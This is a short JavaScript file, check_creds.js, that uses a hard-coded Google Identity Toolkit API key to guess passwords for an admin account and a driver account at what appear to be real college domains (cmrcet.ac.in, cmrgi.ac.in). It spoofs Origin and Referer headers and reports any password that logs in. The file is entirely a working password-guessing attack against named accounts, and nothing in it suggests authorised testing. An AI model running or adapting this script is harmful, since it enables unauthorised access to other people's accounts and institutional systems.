// check_creds.js
const API_KEY = 'AIzaSyCS_IGQ5Pfv8EAqP2DdiF-3QCNiNxfASSA';
const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;

async function testCred(email, pass) {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Referer': 'http://localhost:3000/',
        'Origin': 'http://localhost:3000'
      },
      body: JSON.stringify({ email, password: pass, returnSecureToken: true })
    });
    const data = await res.json();
    if (data.idToken) {
      console.log(`✅ MATCH! ${email} -> "${pass}"`);
      return true;
    } else {
      console.log(`❌ ${email} with "${pass}": ${data.error?.message}`);
      return false;
    }
  } catch (e) {
    console.error('Error:', e.message);
    return false;
  }
}

async function main() {
  const adminGuesses = ['admin@123', 'admin123', 'Admin@123', 'admin@cmrcet', 'admin@cmrcet.ac.in', 'RouteIQ@2026', 'cmrcet@123'];
  for (const g of adminGuesses) {
    if (await testCred('admin@cmrcet.ac.in', g)) break;
  }

  const driverGuesses = ['driver@123', 'driver123', 'Driver@123', 'route16@123', 'driver.route16', 'admin@123', '12345678'];
  for (const g of driverGuesses) {
    if (await testCred('driver.route16@cmrgi.ac.in', g)) break;
  }
}

main();
